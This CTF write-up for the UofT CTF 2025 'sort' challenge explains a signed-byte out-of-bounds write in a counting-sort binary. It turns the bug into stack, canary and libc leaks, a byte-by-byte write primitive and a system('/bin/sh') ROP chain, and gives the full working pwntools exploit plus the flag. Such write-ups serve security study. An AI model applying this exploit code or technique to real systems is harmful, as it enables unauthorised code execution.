---
layout: writeup
category: UofT-CTF-2025
chall_description: 
points: 477
solves: 25
tags: pwn pwn/out-of-bounds pwn/write-what-where
date: 2025-1-12
comments: false
---

Did you know that the best time complexity for a sorting algorithm is O(n). This is an example service that demonstrates this by sorting your characters.

nc 34.170.104.126 5000

Author: White

[sort.zip](https://github.com/Nightxade/ctf-writeups/blob/master/assets/CTFs/UofT-CTF-2025/sort.zip)  

---

### extracting libc shenanigans

First of all, this challenge provides a Dockerfile that includes image that the binary runs on -- for this, we need to extract the libc from the docker image. (including this because in the past when I didn't know Docker I always struggled with this sort of stuff D:)  

Assuming you have docker installed, you can run something like this `docker run -v /home/user/Downloads:/home -i -t ubuntu@sha256:80dd3c3b9c6cecb9f1667e9290b3bc61b78c2678c02cbdae5f0fea92cc6734ab  /bin/bash` to start a container for the image. Then, run `ldd` on some binary (e.g. `ldd /bin/cat`) to get the path of libc. Then copy that to `/home` on the container, and you'll find the libc on your local machine in `/home/user/Downloads`.  

Once you've extracted the libc, copy it to your current directory (where the `echo` binary is located), and run `pwninit`. Now you have a patched binary linking to the correct libc!  

### initial analysis

Okay that's done. Now here's the decompilation (Binary Ninja w/ renamed symbols):  

```c
int64_t sort() {
    void* fsbase
    int64_t rax = *(fsbase + 0x28)
    int64_t s
    __builtin_memset(s: &s, c: 0, n: 0x100)
    int64_t* byte_freq_dict_addr = &s
    void* input = malloc(0x200)
    int32_t num_bytes_read = read(0, input, 0x200)
    for (int32_t i = 0; i s< num_bytes_read; i = i + 1)
        void* dict[input[i]] = byte_freq_dict_addr + sx.q(*(input + sx.q(i)))
        *dict[input[i]] = *dict[input[i]] + 1
    int32_t printed_count_1 = free(input)
    for (int32_t i_1 = 0; i_1 s<= 0xff; i_1 = i_1 + 1)
        int64_t* byte_freq_dict_addr_1 = byte_freq_dict_addr
        byte_freq_dict_addr = byte_freq_dict_addr_1 + 1
        uint32_t dict[i] = zx.d(*byte_freq_dict_addr_1)
        int32_t printed_count = 0
        while (true)
            printed_count_1 = printed_count
            if (printed_count_1 s>= dict[i])
                break
            putchar(zx.q(i_1))
            printed_count = printed_count + 1
    if (rax != *(fsbase + 0x28))
        printed_count_1 = __stack_chk_fail()
    return printed_count_1
}

int64_t main() {
    setup()
    sort()
    return 0
}
```

`checksec` output:  

```yaml
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Damn full protections D:  

So this binary is a simple demonstration of counting sort. Nothing really special there. Instead, it's more helpful to look a bit into the disassembly (or literally just try a bunch of different inputs and step through in the debugger):  

```c
0x13e4: movsx rdx, al
```

This little instruction is moving the value of one of the bytes we inputted into `rdx`, but with `movsx`. It will use `rdx` to calculate what address to increment (the first half of counting sort).  

I actually didn't know what `movsx` did, so I did a bit of research. Basically, it's a `sign-extended move`. What that means is that it treats `al` as a **signed integer**. Why is this important? Well, all byte values greater than `0x7f` are interpreted as negative numbers...  

The counting sort program expects for the bytes to be interpreted as unsigned integers, so it allocates an array of size 0x100 and calculates the address-to-increment as `&byte_freq_dict + input[i]`. But since `input[i]` is interpreted as a signed integer, we hae an OOB -- an out-of-bounds write to negative indices!  

### awfully convenient pointer

The address of `byte_freq_dict` is actually located on the stack! In fact, it's merely 0x10 bytes before `byte_freq_dict` itself. Importantly, this address stored on the stack is what's used to calculate the address-to-increment. (There's also a pointer to the heap allocation for our input, but I didn't use it in my exploit).  

So, with our negative OOB write, we can easily modify this to (mostly) whatever we want, and consequently modify addresses on the stack currently beyond our range of `[byte_freq_dict - 0x80, byte_freq_dict + 0x7f]`. Naturally, I immediately thought of increasing the address by 0x100 (which takes one increment of the 2nd least significant byte of the pointer to `byte_freq_dict`, i.e. offset `&byte_freq_dict-0xf`). This would bring the saved RIP within our modification range.  

### ret2main + leaks yay

Now that the pointer to `byte_freq_dict` points to `byte_freq_dict+0x100`, we can modify the saved RIP, which currently points to `main+28`, to point to the start of `main`. The reason we simply loop back to `main` is because we'll have a lot more information by the end of this call to `sort()`!  

Why? Well, remember that counting sort has two parts to it. The first half was filling in the frequency count for each byte. The second half, for this program, is printing out the frequency array in order. For instance, (higher-level overview), if the frequencies are `[3, 2, 4]`, where the first index represents `A`, the counting sort program would print `AAABBCCCC`.  

Since the pointer to `byte_freq_dict` is near the saved RIP now, this second half to counting sort will actually leak a lot of important addresses off the stack! We just count the frequency of each byte outputted, and then use that to reconstruct the addresses on the stack. This ends up leaking the stack, canary, ELF base, and libc base. Nice!  

Anyways, coming back to rewriting saved RIP -- there's something important I have yet to mention. The counting sort only allows you to sort a maximum of 0x200 bytes. That's actually a pretty major limitation. Why? Well, let's consider the worst case scenario:  

```
saved rip:  0x0101010101010101
desired:    0x0000000000000000
```

Modifying the saved RIP to our desired address would require us, for each byte, to increment from `0x1` to `0x0` (possible because of overflow). Each byte would take `0xff` increments, totalling `0xff*8` ~ `0x800` increments. We definitely don't have the space for that.  

Thankfully, we don't really run into this issue when modifying the saved RIP. Remember that the saved RIP is currently `main+28`, and we want to modify it to `main`. Well, in order to do this, we actually only have to modify the very last byte, since the rest of the addresses' prefixes are the exact same! In our case, we're incrementing `0xbc` to `0xa0`, which takes `0xe4` increments. In total, combined with the number of increments required to change the pointer to `byte_freq_dict` (1 increment), it's `0xe5` increments. Much less than `0x200`, so we're golden!  

However, our limit of `0x200` increments will become very important later on, so keep it in mind.  

### part 1 impl

Here's the implementation for everything explained so far. For now, ignore the call to `change_addr`. I'll explain its necessity and show its implementation later.  

```py
#-------OVERWRITE SAVED RIP-------#

OVERFLOW_CONSTANT = 0x100
MAX_LEN = 0x200
SAVED_RIP = elf.sym.main+0x1c

def change_addr(original: int, new: int, offset: int, num_writes: int=0x8):
    pass

increase_BFD_0x100 = [OVERFLOW_CONSTANT - 0xf]
payload = bytes(increase_BFD_0x100 + change_addr(SAVED_RIP, elf.sym.main, 3*0x8))
assert len(payload) <= MAX_LEN
payload = payload.rjust(MAX_LEN, b'\x00')
send(payload, line=False)

#----------PROCESS LEAKS----------#

if 'GDB' in args: input()

out = p.recvrepeat(0.25)
leaks = [0 for _ in range(0x100)]
for i in out:
    leaks[i] += 1
leaks = list(map(lambda leak: '{:02x}'.format(leak), leaks))
addresses = [int(''.join(leaks[i*8:(i+1)*8][::-1]), 16) for i in range(0x100//8)]

stack_leak = addresses[0]
canary_leak = addresses[1]
elf.address = addresses[3] - elf.sym.sort - 0x270
libc.address = addresses[5] - libc.sym.__libc_start_call_main - 122
```

### roppity rop

At this point, once I got all my leaks, I was ready to start using ROP. I started looking for a way to use the heap pointer I previously mentioned (points to a heap allocation containing our input). I thought that I could potentially do some tcache shenanigans to get a pointer to the stack and then just write a ROP chain from stdin to the stack. But I never quite figured it out.  

So, I turned to my backup plan: taking (abusing) the little incrementing thing I used to modify the saved RIP, and turning it into a write primitive.  

### Write-What*-Where** (sorta)

Here's the implementation of `change_addr` so you can understand how I implemented the write primitive:  

```py
def change_addr(original: int, new: int, offset: int, num_writes: int=0x8):
    freqs = [0 for _ in range(num_writes)]

    for i in range(num_writes):
        freqs[i] = (new & 0xff) - (original & 0xff)
        if freqs[i] < 0: freqs[i] = OVERFLOW_CONSTANT + freqs[i]
        
        new >>= 8
        original >>= 8

    if sum(freqs) > MAX_LEN:
        raise OverflowError(f'Too many writes {hex(sum(freqs))}\n{list(map(hex, freqs))}')
    
    writes = []
    for i in range(num_writes):
        writes += [offset + i]*freqs[i]
    
    return writes
```

Basically, we can abuse the incrementing part of counting sort, turning it into a write primitive. It's contingent on a couple things, namely:  

\* we need to know what was previously written at that address  
\*\* we can only write to stack locations nearby the modified pointer to `byte_freq_dict`, and there's a limit to how much we can modify that pointer  

Lucky for us, condition 1 is already satisfied (remember we leaked 0x100 bytes of the stack) and condition 2 isn't a concern because we don't need that much space to write our ROP chain.  

Great! So now we can implement a simple write primitive, as shown above. The argument names are pretty self-explanatory, although note that `num_writes` represents the number of **bytes**, not addresses, to write. Remember, we can only increment 0x200 times, so the number of bytes we fully modify is limited.  

So, now we have a write primitive that will let us write to any nearby stack address whatever we want. But, we can't write it all in one go, since we're very limited in how many times we can increment an address. So how can we write in our ROP chain?

### "infinite" loop

What we can do instead is simulate an infinite loop. Remember that we were able to previously overwrite the saved RIP to point to `main`. Every time we write something in our ROP chain, we can just point saved RIP to `main` again.  

But do we have enough space? Well, overwriting the saved RIP took only `0xe5` increments (including the 1 increment necessary to add 0x100 to the pointer to `byte_freq_dict`), leaving us with more than `0x100` increments to write our ROP chain each iteration. This is guaranteed to be enough to modify a single byte to what we want -- so we just write a byte every single time! \*

\* even if overwriting the saved RIP took `0x1ff` increments, we'd still be able to write our ROP chain. It would just be very, very slow, as we're adding 1 for every single iteration of counting sort, and the `sort()` function gives us a lot of output every time.  

### mom help the ROP chain is running away

There's a slight issue we have to deal with, though. Every time we loop, the distance between our current saved RIP and our ROP chain increases by 0x8 bytes. In essence, the stack is growing (technically shrinking since the address of $rsp is decreasing), and we can't really write the ROP chain on this changing stack, as the addresses will grow much faster than we can write to them (remember, we can only write a single byte at a time. the stack is growing away from us by 0x8 bytes at a time!).  

Thankfully, this can be easily fixed. Take a look at the disassembly for `main`:  

```yaml
Dump of assembler code for function main:
   0x00000000000014a0 <+0>:     endbr64
   0x00000000000014a4 <+4>:     push   rbp
   0x00000000000014a5 <+5>:     mov    rbp,rsp
   0x00000000000014a8 <+8>:     mov    eax,0x0
   0x00000000000014ad <+13>:    call   0x11e9 <setup>
   0x00000000000014b2 <+18>:    mov    eax,0x0
   0x00000000000014b7 <+23>:    call   0x1230 <sort>
   0x00000000000014bc <+28>:    mov    eax,0x0
   0x00000000000014c1 <+33>:    pop    rbp
   0x00000000000014c2 <+34>:    ret
```

The `main` function (and every function, in fact) runs `push rbp` at the very start. This creates more space on the stack. Typically, this doesn't actually change anything because every function runs `pop rbp` (or `leave`) before the function returns. However, since we never let `main` return, this never happens, causing our stack to grow by 0x8 bytes every time we call `main`!  

To fix this, we can simply overwrite `saved RIP` with `main+5`. This ensures that the stack doesn't grow, and therefore we can freely write our ROP chain.  

Also note that writing `main+5` only changes the number of required increments from `0xe5` to `0xea`. We still have enough space to arbitrarily change a single byte, so our exploit doesn't need to change anything about that -- we can still do byte-by-byte modification!  

### flag time yay!

Now we can finally implement this writing process and finish the script! There's just a few small extra steps in my implementation, which I'll briefly mention:  
- I grew the stack twice to allocate space for the ROP (I overwrote the saved RIP with `main` instead of `main=5` twice) -- pretty sure it's not a necessary step, but I left in there because I was trying something out previously  
- In the very last step, I overwrote the saved RIP with a `ret` gadget. Technically could've done this during the very last write of the ROP chain, but it was easier to implement this way  

Anyways, here's the whole process:  

```py
###################################
#==========BEGIN EXPLOIT==========#
###################################

#-------OVERWRITE SAVED RIP-------#

OVERFLOW_CONSTANT = 0x100
MAX_LEN = 0x200
SAVED_RIP = elf.sym.main+0x1c

def change_addr(original: int, new: int, offset: int, num_writes: int=0x8):
    freqs = [0 for _ in range(num_writes)]

    for i in range(num_writes):
        freqs[i] = (new & 0xff) - (original & 0xff)
        if freqs[i] < 0: freqs[i] = OVERFLOW_CONSTANT + freqs[i]
        
        new >>= 8
        original >>= 8

    if sum(freqs) > MAX_LEN:
        raise OverflowError(f'Too many writes {hex(sum(freqs))}\n{list(map(hex, freqs))}')
    
    writes = []
    for i in range(num_writes):
        writes += [offset + i]*freqs[i]
    
    return writes



increase_BFD_0x100 = [OVERFLOW_CONSTANT - 0xf]
payload = bytes(increase_BFD_0x100 + change_addr(SAVED_RIP, elf.sym.main, 3*0x8))
assert len(payload) <= MAX_LEN
payload = payload.rjust(MAX_LEN, b'\x00')
send(payload, line=False)

#----------PROCESS LEAKS----------#

if 'GDB' in args: input()

out = p.recvrepeat(0.25)
leaks = [0 for _ in range(0x100)]
for i in out:
    leaks[i] += 1
leaks = list(map(lambda leak: '{:02x}'.format(leak), leaks))
addresses = [int(''.join(leaks[i*8:(i+1)*8][::-1]), 16) for i in range(0x100//8)]

stack_leak = addresses[0]
canary_leak = addresses[1]
elf.address = addresses[3] - elf.sym.sort - 0x270
libc.address = addresses[5] - libc.sym.__libc_start_call_main - 122

#---------GROW STACK AGAIN---------#

SAVED_RIP = elf.sym.main+0x1c # update SAVED_RIP since elf.sym.main is updated with elf.address

payload = bytes(increase_BFD_0x100 + change_addr(SAVED_RIP, elf.sym.main, 3*0x8))
assert len(payload) <= MAX_LEN
payload = payload.rjust(MAX_LEN, b'\x00')
send(payload, line=False)

#---------WRITE ROP CHAIN----------#

libc_rop = ROP(libc)
elf_rop = ROP(elf)
binsh = next(libc.search(b"/bin/sh\x00"))
GROW_CNT = 2
FARTHEST_OFFSET = 4

max_payload_len = 0
originals = [stack_leak + 0xb0, stack_leak + 0x10, stack_leak + 0x8]
news = [libc.sym.system, binsh, libc_rop.rdi.address]
offsets = [i + GROW_CNT for i in range(FARTHEST_OFFSET, 3 - GROW_CNT, -1)]
assert len(originals) == len(news)
for i,o,n in zip(range(len(originals)), originals, news):

    j = 0
    while originals[i] and news[i] and originals[i] != news[i]:
        payload = bytes(increase_BFD_0x100)
        payload += bytes(change_addr(originals[i], news[i], offsets[i]*0x8 + j, num_writes=1))
        payload += bytes(change_addr(SAVED_RIP, elf.sym.main+5, 3*0x8))
        assert len(payload) <= MAX_LEN
        max_payload_len = max(max_payload_len, len(payload) - len(increase_BFD_0x100))
        payload = payload.rjust(MAX_LEN, b'\x00')
        send(payload, line=False)

        originals[i] >>= 8
        news[i] >>= 8
        j += 1

#------------WRITE RET------------#

payload = bytes(increase_BFD_0x100)
payload += bytes(change_addr(SAVED_RIP, elf.sym.main+0x22, 3*0x8))
assert len(payload) <= MAX_LEN
payload = payload.rjust(MAX_LEN, b'\x00')
send(payload, line=False)

###################################
#===========END EXPLOIT===========#
###################################
```

Run the script and we get a shell! `cat flag.txt` for the flag :)  

    uoftctf{r3m3mb3r_7h47_ch4r_15_516n3d_by_d3f4ul7}

### special thanks <3

Special thanks to White, the challenge author, for helping me out with infra issues. My challenge was generating too much output and consequently crashing the remote, and so he helped fix up the infra to let my solve work. Much appreciated! :)  

### full script  

Anyways, here's the full script:  

```py
# Useful references:
# https://gist.github.com/anvbis/64907e4f90974c4bdd930baeb705dedf

from pwn import *
import sys
import os
from time import sleep

#---------HELPER FUNCTIONS---------#

def get_leak(before: bytes, end: bytes=b'\n') -> int:
    p.recvuntil(before)
    return int(p.recvuntil(end).decode('ascii')[:-1], 16)

def send(payload: bytes, before: bytes=b'', line: bool=True) -> int:
    payload = payload + (b'\n' if line else b'')
    if before == b'':
        p.send(payload)
    else:
        p.sendafter(before, payload)


#---------SETUP---------#

args = list(map(lambda s: s.upper(), sys.argv))
_libcs = list(filter(lambda s: 'libc.so.6' in s, os.listdir()))
_lds = list(filter(lambda s: 'ld' == s[:2], os.listdir()))

elf = ELF("chall_patched")                                              #------TODO------#
libc = ELF(_libcs[0]) if len(_libcs) else elf.libc
ld = ELF(_lds[0]) if len(_lds) else None

context.binary = elf
context.log_level = "DEBUG"

gdbscript = '''
# b *sort+396
# b *sort+479
b *sort+623
'''

'''
breakpoints:
after read()
after memory write loop
ret after putchar() loop
'''

if 'REMOTE' in args:
    p = remote('34.170.104.126', 5000)                                   #------TODO------#
elif 'LOCAL' in args:
    p = remote('localhost', 5000)
else:
    p = process([elf.path])
    if 'GDB' in args: gdb.attach(p, gdbscript=gdbscript)


#-----------CONSTANTS--------------#

# sh = bytes(asm('mov rax, 0x68732f6e69622f; push rax; mov rdi, rsp; mov rsi, 0; mov rdx, 0; mov rax, SYS_execve; syscall;'))


#-------------NOTES----------------#

'''
movsx --> signed instruction --> input bytes > 0x7f leads to negative offsets

Stack format:
0x060: [Pointer to byte_freq_dict (BFD)] [Pointer to input chunk]
0x070: BFD[0x100]
0x170: [Pointer to 0x180] [CANARY]
0x180: [Pointer to 0x190] [Saved RIP (main+28)]
0x190: [Pointer to 0x230] [Another saved RIP (__libc_start_call_main+122)]
'''


###################################
#==========BEGIN EXPLOIT==========#
###################################

#-------OVERWRITE SAVED RIP-------#

OVERFLOW_CONSTANT = 0x100
MAX_LEN = 0x200
SAVED_RIP = elf.sym.main+0x1c

def change_addr(original: int, new: int, offset: int, num_writes: int=0x8):
    freqs = [0 for _ in range(num_writes)]

    for i in range(num_writes):
        freqs[i] = (new & 0xff) - (original & 0xff)
        if freqs[i] < 0: freqs[i] = OVERFLOW_CONSTANT + freqs[i]
        
        new >>= 8
        original >>= 8

    if sum(freqs) > MAX_LEN:
        raise OverflowError(f'Too many writes {hex(sum(freqs))}\n{list(map(hex, freqs))}')
    
    writes = []
    for i in range(num_writes):
        writes += [offset + i]*freqs[i]
    
    return writes



increase_BFD_0x100 = [OVERFLOW_CONSTANT - 0xf]
payload = bytes(increase_BFD_0x100 + change_addr(SAVED_RIP, elf.sym.main, 3*0x8))
assert len(payload) <= MAX_LEN
payload = payload.rjust(MAX_LEN, b'\x00')
send(payload, line=False)

#----------PROCESS LEAKS----------#

if 'GDB' in args: input()

out = p.recvrepeat(0.25)
leaks = [0 for _ in range(0x100)]
for i in out:
    leaks[i] += 1
leaks = list(map(lambda leak: '{:02x}'.format(leak), leaks))
addresses = [int(''.join(leaks[i*8:(i+1)*8][::-1]), 16) for i in range(0x100//8)]

stack_leak = addresses[0]
canary_leak = addresses[1]
elf.address = addresses[3] - elf.sym.sort - 0x270
libc.address = addresses[5] - libc.sym.__libc_start_call_main - 122

#---------GROW STACK AGAIN---------#

SAVED_RIP = elf.sym.main+0x1c # update SAVED_RIP since elf.sym.main is updated with elf.address

payload = bytes(increase_BFD_0x100 + change_addr(SAVED_RIP, elf.sym.main, 3*0x8))
assert len(payload) <= MAX_LEN
payload = payload.rjust(MAX_LEN, b'\x00')
send(payload, line=False)

#---------WRITE ROP CHAIN----------#

libc_rop = ROP(libc)
elf_rop = ROP(elf)
binsh = next(libc.search(b"/bin/sh\x00"))
GROW_CNT = 2
FARTHEST_OFFSET = 4

max_payload_len = 0
originals = [stack_leak + 0xb0, stack_leak + 0x10, stack_leak + 0x8]
news = [libc.sym.system, binsh, libc_rop.rdi.address]
offsets = [i + GROW_CNT for i in range(FARTHEST_OFFSET, 3 - GROW_CNT, -1)]
assert len(originals) == len(news)
for i,o,n in zip(range(len(originals)), originals, news):

    j = 0
    while originals[i] and news[i] and originals[i] != news[i]:
        payload = bytes(increase_BFD_0x100)
        payload += bytes(change_addr(originals[i], news[i], offsets[i]*0x8 + j, num_writes=1))
        payload += bytes(change_addr(SAVED_RIP, elf.sym.main+5, 3*0x8))
        assert len(payload) <= MAX_LEN
        max_payload_len = max(max_payload_len, len(payload) - len(increase_BFD_0x100))
        payload = payload.rjust(MAX_LEN, b'\x00')
        send(payload, line=False)

        originals[i] >>= 8
        news[i] >>= 8
        j += 1

#------------WRITE RET------------#

payload = bytes(increase_BFD_0x100)
payload += bytes(change_addr(SAVED_RIP, elf.sym.main+0x22, 3*0x8))
assert len(payload) <= MAX_LEN
payload = payload.rjust(MAX_LEN, b'\x00')
send(payload, line=False)

###################################
#===========END EXPLOIT===========#
###################################


p.interactive()
p.close()

'''
TL;DR:
char is interpreted as a signed byte --> movsx is a sign extended move --> possible to write to negative offsets

stack looks like this:
0x060: [Pointer to byte_freq_dict (BFD)] [Pointer to input chunk]
0x070: BFD[0x100]
0x170: [Pointer to 0x180] [CANARY]
0x180: [Pointer to 0x190] [Saved RIP (main+28)]
0x190: [Pointer to 0x230] [Another saved RIP (__libc_start_call_main+122)]

offsets are calculated from &BFD
we can overwrite the [Pointer to byte_freq_dict (BFD)] and add 0x100 to BFD with a single increment at offset -0xf
from there, we can overwrite the saved RIP to point to main()
    overwriting the saved RIP to point to main() fits in < 0x200 bytes because saved RIP originally points to main()+28
    therefore, since the prefix bytes are the same, we only have to change a single byte (which is obviously < 0x200 bytes)
the output part of the counting sort will now leak a lot of info: stack, canary, elf base, libc base
returning to main() will grow the stack by 0x8 bytes, BFD stays in the same place
repeat the same process of increasing BFD by 0x100 and overwriting saved RIP to point to main() --> stack grows 0x8 bytes
now, there's enough space to write a simple system("/bin/sh") ROP chain
we can construct a write primitive that can write to anywhere relevant on the stack
then we repeat this for the number of bytes in our ROP chain:
    1. increase BFD by 0x100
    2. change a single byte to a byte of one of our ROP chain's addresses
    3. change saved RIP to point to main() + 5 --> stack doesn't grow anymore
    *note that we can only change a single byte at a time due to input space constraints:
        1. input of 1 byte
        2. input of < 0x100 bytes (need to arbitrarily modify a single byte)
        3. input of < 0x100 bytes  (need to arbitrarily modify a single byte)
with this, we can write our ROP chain right after the saved RIP
then we can, for the final modification:
    1. increase BFD by 0x100
    2. change saved RIP to point to a ret gadget in our ELF
        again, it must be a ret gadget in the ELF in order for the overwrite to not change too many bytes
and with that, we get the flag!

special thanks to White for helping me with remote output issues
'''
# uoftctf{r3m3mb3r_7h47_ch4r_15_516n3d_by_d3f4ul7}
```